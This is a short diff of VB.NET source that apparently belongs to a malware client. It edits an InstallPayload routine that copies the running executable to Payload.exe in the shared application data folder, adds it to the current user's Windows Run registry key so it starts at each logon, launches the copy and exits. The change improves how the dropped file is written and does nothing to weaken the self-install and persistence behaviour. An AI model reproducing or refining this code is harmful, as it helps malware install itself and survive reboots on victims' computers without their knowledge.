@@ -101,10 +101,16 @@
     Public Sub InstallPayload()
         Try
             Dim ClientFullPath As String = IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Payload.exe")
-            Using Drop As New IO.FileStream(ClientFullPath, IO.FileMode.Create)
-                Dim Client As Byte() = IO.File.ReadAllBytes(Diagnostics.Process.GetCurrentProcess.MainModule.FileName)
-                Drop.Write(Client, 0, Client.Length)
-            End Using
+            Dim Drop As IO.FileStream = Nothing
+            If IO.File.Exists(ClientFullPath) Then
+                Drop = New IO.FileStream(ClientFullPath, IO.FileMode.Create)
+            Else
+                Drop = New IO.FileStream(ClientFullPath, IO.FileMode.CreateNew)
+            End If
+            Dim Client As Byte() = IO.File.ReadAllBytes(Diagnostics.Process.GetCurrentProcess.MainModule.FileName)
+            Drop.Write(Client, 0, Client.Length)
+            Drop.Flush()
+
             Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(IO.Path.GetFileName(ClientFullPath), ClientFullPath)
             Diagnostics.Process.Start(ClientFullPath)
             Environment.Exit(0)
